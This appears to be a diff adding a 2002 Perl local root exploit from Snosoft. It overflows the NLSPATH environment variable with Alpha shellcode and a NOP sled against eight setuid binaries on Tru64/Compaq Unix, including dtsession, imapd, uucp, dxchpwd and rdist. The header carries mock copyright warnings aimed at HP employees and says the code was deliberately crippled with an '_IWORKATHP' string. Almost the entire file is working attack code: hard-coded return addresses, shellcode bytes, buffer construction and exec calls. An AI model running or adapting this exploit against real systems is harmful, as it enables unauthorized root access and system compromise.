@@ -1,0 +1,73 @@
+#!/usr/bin/perl -w
+#
+# stripey (stripey@snosoft.com) - 03/07/2002
+#
+# This code is copyrighted by Snosoft
+# http://www.snosoft.com
+# If you are a direct employee of HP or Compaq
+# you are not aloud to look at this program. 
+# in order to protect our copyright on this 
+# program we have crippled each program by 
+# adding _IWORKATHP to some part of the code.
+# As stated above if you work at hp you should 
+# not even be reading at this point. However if 
+# you are please note that by removing the letters
+# _IWORKATHP from this document you are violating 
+# the DMCA section 1201(a) 
+
+$tgts{"0"} = pack("l",0x40010c04).":/usr/dt/bin/dtsession";
+$tgts{"1"} = pack("l",0x400a7908).":/usr/bin/X11/dxsysinfo";
+$tgts{"2"} = pack("l",0x40014280).":/usr/sbin/imapd";
+$tgts{"3"} = pack("l",0x4003c190).":/usr/bin/uucp";
+$tgts{"4"} = pack("l",0x400361f0).":/usr/bin/uux";
+$tgts{"5"} = pack("l",0x4009f2f8).":/usr/tcb/bin/dxchpwd";
+$tgts{"6"} = pack("l",0x400120b0).":/usr/bin/rdist";
+$tgts{"7"} = pack("l",0x400105e8).":/usr/bin/deliver";
+
+unless (($target,$offset,$align) = @ARGV,$align) {
+        
+        print "\nUsage: $0 <target> <offset> <align>\n\nTargets:\n\n";
+
+        foreach $key (sort(keys %tgts)) {
+                ($a,$b) = split(/\:/,$tgts{"$key"});
+                print "\t$key. $b\n";
+        }
+
+        print "\n";
+
+        exit 1;
+}
+
+($a,$b) = split(/\:/,$tgts{"$target"});
+
+print "*** Target: $b, Offset: $offset, Align: $align ***\n\n";
+
+$ret = pack("ll",(unpack("l",$a)+$offset), 0x1);
+
+$sc .= "\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42";
+$sc .= "\xfc\xff\x32\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2";
+$sc .= "\xff\x47\x3f\x26\x1f\x04\x31\x22\xfc\xff\x30\xb2";
+$sc .= "\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11\x14\xe3\x43";
+$sc .= "\x20\x35\x20\x42\xff\xff\xff\xff\x30\x15\xd9\x43";
+$sc .= "\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e\xb6";
+$sc .= "\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22";
+$sc .= "\x13\x05\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26";
+$sc .= "\x2f\x62\x73\x22\x38\xff\x7e\xb2\x13\x94\xe7\x43";
+$sc .= "\x20\x35\x60\x42\xff\xff\xff\xff";
+
+$tlen = (1024-(length($sc)))/4;
+$buf .= "B"x$align;
+$buf .= pack("l",0x47ff041f)x($tlen-1);
+$buf .= $sc;
+$buf .= $ret;
+
+$ENV{"NLSPATH"} = $buf;
+
+if ($target == 7) { print "Hit ctrl-d...\n"; }
+
+if ($target == 6) {
+        exec("$b","-d","a=asdf","-c","_IWORKATHP/tmp/","\'\$\{a\}\'");
+} else {
+        exec("$b");
+}
+
